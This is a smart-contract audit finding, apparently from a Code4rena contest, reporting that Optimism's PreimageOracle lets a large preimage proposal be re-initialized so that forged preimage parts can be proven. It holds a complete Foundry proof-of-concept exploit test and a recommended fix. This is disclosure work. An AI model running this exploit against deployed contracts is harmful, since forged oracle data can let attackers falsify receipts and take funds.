# #2: Large preimage proposal can be forged given a controlled preimage
Labels: ['bug', '3 (High Risk)', 'satisfactory', 'sufficient quality report', ':robot:_13_group', 'duplicate-27']
Accepted: False

# Lines of code

https://github.com/code-423n4/2024-07-optimism/blob/2e11e15e7a9a86f90de090ebf9e3516279e30897/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L416-L693


# Vulnerability details

## Impact
An attacker can forge arbitrary LPPs if they control at least 32 bytes within the preimage. This can be used by the attacker to forge receipts by emitting an event with their desired 32 byte values.

## Proof of Concept
```
    function test_exploit_controlledDataPlacement() public {
        // here is the original payload, this is the hash we want to collide
        bytes memory data = abi.encodePacked("Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.");

        // normally, preimageParts(digest, offset) = data[offset:offset+32]
        // we're going to prove that preimageParts(digest, offset) = data[controlledOffset:controlledOffset+32]
        uint32 offset = 16;
        uint32 controlledOffset = 100; 
        
        /* BEGIN EXPLOIT */

        // initialize with a fake offset so we can guarantee a write to proposalParts
        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, controlledOffset+8, uint32(data.length));

        // generate the state commitments and add the leaves
        LibKeccak.StateMatrix memory stateMatrix;
        bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);
        oracle.addLeavesLPP(TEST_UUID, 0, data, stateCommitments, true);

        // generate the leaves
        LibKeccak.StateMatrix memory matrix;
        PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, data);

        // generate the proofs
        (, bytes32[] memory preProof) = _generateProof(leaves.length - 2, leaves);
        (, bytes32[] memory postProof) = _generateProof(leaves.length - 1, leaves);

        // nothing to challenge!
        vm.warp(block.timestamp + oracle.challengePeriod() + 1 seconds);

        // exploit!
        oracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, offset, uint32(data.length));

        // squeeze
        LibKeccak.StateMatrix memory preMatrix = _stateMatrixAtBlockIndex(data, leaves.length - 1);
        oracle.squeezeLPP({
            _claimant: address(this),
            _uuid: TEST_UUID,
            _stateMatrix: preMatrix,
            _preState: leaves[leaves.length - 2],
            _preStateProof: preProof,
            _postState: leaves[leaves.length - 1],
            _postStateProof: postProof
        });

        bytes32 desiredValue;
        assembly { desiredValue := mload(add(add(data, 0x20), controlledOffset)) }

        bytes32 finalDigest = _setStatusByte(keccak256(data), 2);
        assertTrue(oracle.preimagePartOk(finalDigest, offset));
        assertEq(oracle.preimageLengths(finalDigest), data.length);
        assertEq(oracle.preimageParts(finalDigest, offset), desiredValue);
    }
```

## Tools Used
The power of friendship

## Recommended Mitigation Steps
Don't allow re-initializing a LPP proof once it's already begun


## Assessed type

Invalid Validation